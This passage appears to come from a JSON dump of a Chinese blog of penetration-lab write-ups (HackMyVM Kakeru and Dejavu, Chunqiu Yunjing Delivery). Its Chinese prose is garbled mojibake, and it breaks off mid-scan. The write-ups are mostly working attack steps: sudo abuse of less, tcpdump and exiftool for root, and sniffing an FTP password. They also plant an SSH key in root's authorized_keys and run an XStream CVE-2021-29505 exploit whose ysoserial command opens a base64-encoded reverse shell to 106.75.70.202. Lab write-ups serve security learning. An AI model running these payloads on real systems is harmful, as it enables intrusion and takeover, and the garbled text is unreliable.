å°±åœ¨è¿™é‡Œï¼Œè¿˜æœ‰ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯ä»¥è”æƒ³åˆ°ï¼Œå¯†ç åº”è¯¥å°±æ˜¯ç”¨æ­£åˆ™å»åŒ¹é…ä¸Šé¢çš„æ•°æ®åŒ… 1234â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# http http://192.168.31.170|grep -P &#x27;(?&lt;=x-).+(?=en)&#x27; -owww-form-urlhighlight&quot;&gt;(?&amp;lt;=x-).+(?= å¯†ç å°±æ˜¯www-form-url sshç™»å½• ææƒ12345678910111213141516171819202122232425262728293031welcome@Kakeru:~$ lssudoers.bak user.txtwelcome@Kakeru:~$ cat sudoers.bak## This file MUST be edited with the &#x27;visudo&#x27; command as root.## Please consider adding local content in /etc/sudoers.d/ instead of# directly modifying this file.## See the man page for details on how to write a sudoers file.#Defaults env_resetDefaults mail_badpassDefaults secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;# Host alias specification# User alias specification# Cmnd alias specification# User privilege specificationroot ALL=(ALL:ALL) ALL# Allow members of group sudo to execute any command%sudo ALL=(ALL:ALL) ALLwelcome Dashazi=(kakeru) NOPASSWD: /usr/bin/lesskakeru ALL=(ALL:ALL) NOPASSWD: /opt/test.sh# See sudoers(5) for more information on &quot;@include&quot; directives:@includedir /etc/sudoers.d welcomeå¯ä»¥åœ¨Dashaziä¸Šä»¥kakeruç”¨æˆ·æ‰§è¡Œ/usr/bin/less 12welcome@Kakeru:~$ sudo -u kakeru -h Dashazi /usr/bin/less --help!sh 123456kakeru@Kakeru:/opt$ sudo -lMatching Defaults entries for kakeru on Kakeru: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser kakeru may run the following commands on Kakeru: (ALL : ALL) NOPASSWD: /opt/test.sh å¯ä»¥çœ‹åˆ°å¯ä»¥æ‰§è¡Œ/opt/test.shï¼Œä½†æ˜¯å†…å®¹æ²¡åŠæ³•çœ‹ï¼ŒåŒæ—¶å®¶ç›®å½•ä¹Ÿæœ‰ä¸€ä¸ªtest.sh,è¿™ä¸¤ä¸ªæ–‡ä»¶å¯èƒ½å­˜åœ¨å…³ç³» 123kakeru@Kakeru:/opt$ sudo /opt/test.shPlease Input: a/opt/test.sh: line 5: a: command not found è¿è¡Œå‘ç°åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œè¾“å…¥ç©ºæ ¼å¯ä»¥å‘ç° 123kakeru@Kakeru:/opt$ sudo /opt/test.shPlease Input:/opt/test.sh: line 5: /home/kakeru/test.sh: Permission denied å“ï¼æŠ¥é”™äº†ï¼ŒæŒ‡å‘å®¶ç›®å½•çš„test.shï¼Œè€Œå®¶ç›®å½•çš„test.shæ˜¯æ²¡æœ‰å¯æ‰§è¡Œæƒé™çš„ï¼Œæ‰€ä»¥å°±èƒ½çŸ¥é“ç¨‹åºä»¥ä½ è¾“å…¥çš„é‚£ä¸ªå­—ç¬¦æ¥è¿è¡Œ/home/kakeru/test.shï¼Œè¾“å…¥ä¸€ä¸ª. 123kakeru@Kakeru:~$ sudo /opt/test.shPlease Input: .test ä¼šå‘ç°/home/kakeru/test.shè¢«æ‰§è¡Œäº†ï¼Œå°†å®¶ç›®å½•çš„test.shæ–‡ä»¶æ”¹ä¸ªåå†é‡æ–°å†™ä¸€ä¸ªtest.sh 123456kakeru@Kakeru:~$ mv test.sh 1kakeru@Kakeru:~$ echo &#x27;bash -p&#x27;&gt;test.shkakeru@Kakeru:~$ chmod +x ./test.shkakeru@Kakeru:~$ sudo /opt/test.shPlease Input:root@Kakeru:/home/kakeru# ææƒæˆåŠŸ","categories":[{"name":"660930334","slug":"660930334","permalink":"https://lvzhouhang.xyz/categories/660930334/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Dejavu","slug":"HackmyVM-Dejavu","date":"2025-04-29T02:45:14.000Z","updated":"2025-05-19T16:30:42.165Z","comments":true,"path":"2025/04/29/HackmyVM-Dejavu/","permalink":"https://lvzhouhang.xyz/2025/04/29/HackmyVM-Dejavu/","excerpt":"","text":"ä¿¡æ¯æœé›†1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:8f:69:69 PCS Systemtechnik GmbH192.168.31.169 08:00:27:b7:b2:91 PCS Systemtechnik GmbH 192.168.31.169å°±æ˜¯é¶æœºåœ°å€ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.169Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-28 22:42 EDTNmap scan report for 192.168.31.169Host is up (0.00087s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:B7:B2:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds 80ç«¯å£123456789101112131415161718â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.169/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.169/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php,txt[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/info.php (Status: 200) [Size: 69969] åªèƒ½æ‰«åˆ°ä¸€ä¸ªinfo.phpï¼Œæ˜¯ä¸€ä¸ªphpinfoé¡µé¢ï¼Œå‰ç«¯æ³¨é‡Šé‡Œæœ‰ä¸€ä¸ª 1&lt;!-- /S3cR3t --&gt; è®¿é—®/S3cR3tæœ‰ä¸€ä¸ªupload.php,phpåç¼€ç¦æ­¢ä¸Šä¼ ï¼Œæ”¹åç¼€ä¸ºphtml,æœ‰disable_functionï¼Œå¯ä»¥ç”¨èšå‰‘çš„æ’ä»¶ç»•è¿‡disable_functionsç»•è¿‡ åå¼¹ä¸€ä¸ªshellå‡ºæ¥ ææƒ1234567www-data@dejavu:/opt$ sudo -lMatching Defaults entries for www-data on dejavu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on dejavu: (robert) NOPASSWD: /usr/sbin/tcpdump å¯ä»¥æ— å¯†ç ä»¥robertæ‰§è¡Œtcpdump 12345COMMAND=&#x27;id&#x27;TF=$(mktemp)echo &quot;$COMMAND&quot; &gt; $TFchmod +x $TFsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root ä½†æ˜¯ææƒçš„æ—¶å€™æç¤ºæƒé™ä¸å¤Ÿï¼Œåªèƒ½å¦å¯»ä»–è·¯ ä¸Šä¼ ä¸€ä¸ªpspy64ï¼Œç›‘æ§è¿›ç¨‹ 1234562025/04/29 03:05:01 CMD: UID=1000 PID=1715 | /usr/sbin/CRON -f2025/04/29 03:05:01 CMD: UID=1000 PID=1716 | /bin/sh -c /home/robert/auth.sh2025/04/29 03:05:01 CMD: UID=1000 PID=1717 | /bin/sh /home/robert/auth.sh2025/04/29 03:05:01 CMD: UID=65534 PID=1719 | /usr/sbin/vsftpd /etc/vsftpd.conf2025/04/29 03:05:01 CMD: UID=0 PID=1718 | /usr/sbin/vsftpd /etc/vsftpd.conf2025/04/29 03:05:01 CMD: UID=1000 PID=1720 | /usr/sbin/vsftpd /etc/vsftpd.conf å‘ç°robertä¼šè¿è¡Œauth.shï¼Œè¿˜å’Œftpæœ‰å…³ç³»ï¼Œç”¨tcpdumpæŠ“ä¸€ä¸‹åŒ…çœ‹çœ‹ 123456789101112131415www-data@dejavu:/tmp$ sudo -u robert /usr/sbin/tcpdump tcp port 21 -i lotcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes03:09:01.651819 IP localhost.51594 &gt; localhost.ftp: Flags [S], seq 1560518222, win 65495, options [mss 65495,sackOK,TS val 2363185351 ecr 0,nop,wscale 7], length 003:09:01.651828 IP localhost.ftp &gt; localhost.51594: Flags [S.], seq 206236889, ack 1560518223, win 65483, options [mss 65495,sackOK,TS val 2363185351 ecr 2363185351,nop,wscale 7], length 003:09:01.651835 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 1, win 512, options [nop,nop,TS val 2363185351 ecr 2363185351], length 003:09:01.652915 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 2363185352 ecr 2363185351], length 20: FTP: 220 (vsFTPd 3.0.3)03:09:01.653039 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 003:09:01.653087 IP localhost.51594 &gt; localhost.ftp: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 13: FTP: USER robert03:09:01.653089 IP localhost.ftp &gt; localhost.51594: Flags [.], ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 003:09:01.653260 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 34: FTP: 331 Please specify the password.03:09:01.653312 IP localhost.51594 &gt; localhost.ftp: Flags [.], ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 003:09:01.653355 IP localhost.51594 &gt; localhost.ftp: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 18: FTP: PASS 9737bo0hFx403:09:01.653357 IP localhost.ftp &gt; localhost.51594: Flags [.], ack 32, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 003:09:01.664382 IP localhost.ftp &gt; localhost.51594: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 2363185364 ecr 2363185353], length 23: FTP: 230 Login successful. å¯ä»¥å‘ç°robertçš„å¯†ç æ˜¯9737bo0hFx4,suåˆ‡æ¢ç”¨æˆ· 1234567robert@dejavu:/tmp$ sudo -lMatching Defaults entries for robert on dejavu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser robert may run the following commands on dejavu: (root) NOPASSWD: /usr/local/bin/exiftool exiftoolå¯ä»¥å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œå†™ä¸ªå…¬é’¥å³å¯ 123LFILE=file_to_writeINPUT=input_filesudo exiftool -filename=$LFILE $INPUT 12robert@dejavu:/tmp$ sudo exiftool -filename=$LFILE $INPUTError: &#x27;/root/.ssh/authorized_keys&#x27; already exists - ./authorized_keys å·²ç»å­˜åœ¨äº†ï¼Œé‚£å°±æŠŠè¿™ä¸ªå…¬é’¥ç§»åŠ¨è¿‡æ¥ï¼Œç„¶åå†å†™ä¸€ä¸ªå…¬é’¥è¿›å»ã€‚ exiftool -filename=$LFILE $INPUTæ˜¯å°†æºæ–‡ä»¶çš„filenameå±æ€§ä¿®æ”¹ï¼Œä½†å…¶ä¸æ›´æ”¹æ–‡ä»¶æœ¬èº«æ‰€å±ï¼Œauthorized_keysåˆå¿…éœ€æ˜¯è¦å±äºrootç”¨æˆ·çš„ï¼Œæ‰€ä»¥éœ€è¦å…ˆå°†åŸæ¥çš„authorized_keysç»™å¤åˆ¶è¿‡æ¥ï¼Œç„¶åä¿®æ”¹å…¶å±æ€§ä¸ºå¯è¯»å¯å†™ï¼Œå†å°†å…¬é’¥å†™è¿›å»ï¼Œå†æŠŠæƒé™ä¿®æ”¹å›æ¥ä¹‹åå†å†™è¿›å» 1234567891011121314151617181920robert@dejavu:~$ sudo exiftool -filename=./1 /root/.ssh/authorized_keys 1 image files updatedrobert@dejavu:~$ sudo exiftool 1ExifTool Version Number : 12.23File Name : 1Directory : .File Size : 0 bytesFile Modification Date/Time : 2022:05:12 17:33:23+00:00File Access Date/Time : 2022:05:13 14:33:26+00:00File Inode Change Date/Time : 2025:05:19 16:28:04+00:00File Permissions : -rw-------Error : File is emptyrobert@dejavu:~$ sudo exiftool -FilePermissions=&#x27;-rw-rw-rw-&#x27; ./1 1 image files updatedrobert@dejavu:~$ echo &#x27;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcatU49PfwyMAfrfJcaaIFCNOJNWOdDonEg3ahNxG8H root@kali&#x27;&gt;1robert@dejavu:~$ sudo exiftool -FilePermissions=&#x27;-rw-------&#x27; ./1 1 image files updatedrobert@dejavu:~$ sudo exiftool -filename=/root/.ssh/authorized_keys ./1 1 image files updated ç„¶åsshå°±å¯ä»¥ç™»å½•äº†","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-Delivery","slug":"æ˜¥ç§‹äº‘é•œ-Delivery","date":"2025-04-27T07:42:03.000Z","updated":"2025-04-29T03:23:01.542Z","comments":true,"path":"2025/04/27/æ˜¥ç§‹äº‘é•œ-Delivery/","permalink":"https://lvzhouhang.xyz/2025/04/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/","excerpt":"","text":"FLAG01å…ˆç”¨ fscan è¿›è¡Œä¸€æ³¢ä¿¡æ¯æœé›† 12345678910111213141516171819202122232425262728293031â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ../pentest/fscan/fscan2 -h 39.99.157.149â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ â”‚â”‚ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-27 03:44:50] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-27 03:44:50] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-27 03:44:50] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1[2025-04-27 03:44:51] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-27 03:44:51] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-27 03:44:51] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.157.149:22[2025-04-27 03:44:51] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.157.149:80[2025-04-27 03:44:51] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.157.149:21[2025-04-27 03:44:51] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.157.149:22 =&gt; [ssh] ç‰ˆæœ¬: 8.2p1 Ubuntu 4ubuntu0.5 äº§å“: OpenSSH ç³»ç»Ÿ: Linux ä¿¡æ¯: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-27 03:44:51] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.157.149:21 =&gt; [ftp] ç‰ˆæœ¬: 3.0.3 äº§å“: vsftpd ç³»ç»Ÿ: Unix Banner: [220 (vsFTPd 3.0.3).][2025-04-27 03:44:53] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.157.149:8080[2025-04-27 03:44:56] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.157.149:80 =&gt; [http][2025-04-27 03:44:59] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.157.149:8080 =&gt; [http][2025-04-27 03:45:00] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4[2025-04-27 03:45:00] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-27 03:45:00] [INFO] åŠ è½½çš„æ’ä»¶: ftp, ssh, webpoc, webtitle[2025-04-27 03:45:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.157.149 çŠ¶æ€ç : 200 é•¿åº¦: 10918 æ ‡é¢˜: Apache2 Ubuntu Default Page: It works[2025-04-27 03:45:02] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ![2025-04-27 03:45:02] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.157.149:8080 çŠ¶æ€ç : 200 é•¿åº¦: 3655 æ ‡é¢˜: å…¬å¸å‘è´§å•[2025-04-27 03:45:08] [SUCCESS] æ‰«æå·²å®Œæˆ: 6/6 ftp å¯ä»¥åŒ¿åç™»é™†ï¼Œç™»å½•ä¹‹åå¯ä»¥ä¸‹è½½ä¸€ä¸ª pom.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt; project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot; xmlns: xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi: schemaLocation = &quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot; &gt; &lt;modelVersion&gt; 4.0.0 &lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-starter-parent &lt;/artifactId&gt; &lt;version&gt; 2.7.2 &lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt; com.example &lt;/groupId&gt; &lt;artifactId&gt; ezjava &lt;/artifactId&gt; &lt;version&gt; 0.0.1-SNAPSHOT &lt;/version&gt; &lt;name&gt; ezjava &lt;/name&gt; &lt;description&gt; ezjava &lt;/description&gt; &lt;properties&gt; &lt;java.version&gt; 1.8 &lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-starter-thymeleaf &lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-starter-web &lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-starter-test &lt;/artifactId&gt; &lt;scope&gt; test &lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; com.thoughtworks.xstream &lt;/groupId&gt; &lt;artifactId&gt; xstream &lt;/artifactId&gt; &lt;version&gt; 1.4.16 &lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; commons-collections &lt;/groupId&gt; &lt;artifactId&gt; commons-collections &lt;/artifactId&gt; &lt;version&gt; 3.2.1 &lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt; org.springframework.boot &lt;/groupId&gt; &lt;artifactId&gt; spring-boot-maven-plugin &lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; å­˜åœ¨æœ‰å±é™©çš„ä¾èµ– 1234567891011&lt;dependency&gt; &lt;groupId&gt; com.thoughtworks.xstream &lt;/groupId&gt; &lt;artifactId&gt; xstream &lt;/artifactId&gt; &lt;version&gt; 1.4.16 &lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt; commons-collections &lt;/groupId&gt; &lt;artifactId&gt; commons-collections &lt;/artifactId&gt; &lt;version&gt; 3.2.1 &lt;/version&gt; &lt;/dependency&gt; å­˜åœ¨ CVE-2021-29505 ç”¨ ysoserial è¿›è¡Œåå¼¹ shell 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot; bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNzUuNzAuMjAyLzQ0NDQgMD4mMQ ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; åœ¨ 8080 ç«¯å£æŠ“åŒ…æ›¿æ¢æˆ payload 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt; 2 &lt;/size&gt; &lt;/default&gt; &lt;int&gt; 3 &lt;/int&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt; 12345 &lt;/type&gt; &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt; &lt;m__obj class=&#x27;string&#x27;&gt; com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content &lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt; 12345 &lt;/type&gt; &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt; &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt; &lt;parsedMessage&gt; true &lt;/parsedMessage&gt; &lt;soapVersion&gt; SOAP_11 &lt;/soapVersion&gt; &lt;bodyParts/&gt; &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt; &lt;attachmentsInitialized&gt; false &lt;/attachmentsInitialized&gt; &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt; &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt; &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt; &lt;names&gt; &lt;string&gt; aa &lt;/string&gt; &lt;string&gt; aa &lt;/string&gt; &lt;/names&gt; &lt;ctx&gt; &lt;environment/&gt; &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt; &lt;java.rmi.server.RemoteObject&gt; &lt;string&gt; UnicastRef &lt;/string&gt; &lt;string&gt; 106.75.70.202 &lt;/string&gt; &lt;int&gt; 1099 &lt;/int&gt; &lt;long&gt; 0 &lt;/long&gt; &lt;int&gt; 0 &lt;/int&gt; &lt;long&gt; 0 &lt;/long&gt; &lt;short&gt; 0 &lt;/short&gt; &lt;boolean&gt; false &lt;/boolean&gt; &lt;/java.rmi.server.RemoteObject&gt; &lt;/registry&gt; &lt;host&gt; 106.75.70.202 &lt;/host&gt; &lt;port&gt; 1099 &lt;/port&gt; &lt;/ctx&gt; &lt;/candidates&gt; &lt;/aliases&gt; &lt;/nullIter&gt; &lt;/sm&gt; &lt;/message&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt; å‘åŒ…ä¹‹å shell å°±å¼¹å‡ºæ¥äº†ï¼Œç„¶åå†™ä¸ªå…¬é’¥è¿›å»ï¼Œflag1 åœ¨/root/flag ä¸‹ FLAG02ä¸Šä¼ ä¸€ä¸ª fscan æ‰«æå†…ç½‘ï¼Œå†æ­å»ºä¸€ä¸ªä»£ç† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495root@ubuntu:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 :: 1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e: 09:09:4b brd ff: ff: ff: ff: ff: ff inet 172.22.13.14/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315359007sec preferred_lft 315359007sec inet6 fe80:: 216:3eff: fe09:94b/64 scope link valid_lft forever preferred_lft foreverroot@ubuntu:~# ./fflag/ fscan2root@ubuntu:~# ./fscan2 -h 172.22.13.14/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ _ __ __ _ _ __ __ _ _ __| | __ â”‚â”‚ / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\_ _,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-27 15:59:52] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-27 15:59:52] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-27 15:59:52] [INFO] CIDR èŒƒå›´: 172.22.13.0-172.22.13.255[2025-04-27 15:59:52] [INFO] ç”Ÿæˆ IP èŒƒå›´: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)[2025-04-27 15:59:52] [INFO] è§£æ CIDR 172.22.13.14/24 -&gt; IP èŒƒå›´ 172.22.13.0-172.22.13.255[2025-04-27 15:59:52] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-04-27 15:59:52] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-27 15:59:52] [SUCCESS] ç›®æ ‡ 172.22.13.14 å­˜æ´» (ICMP)[2025-04-27 15:59:52] [SUCCESS] ç›®æ ‡ 172.22.13.6 å­˜æ´» (ICMP)[2025-04-27 15:59:52] [SUCCESS] ç›®æ ‡ 172.22.13.57 å­˜æ´» (ICMP)[2025-04-27 15:59:52] [SUCCESS] ç›®æ ‡ 172.22.13.28 å­˜æ´» (ICMP)[2025-04-27 15:59:55] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4[2025-04-27 15:59:55] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.57:22[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.14:22[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.14:21[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:80[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.57:80[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:135[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.14:80[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:135[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:445[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:88[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:389[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:139[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:139[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:445[2025-04-27 15:59:55] 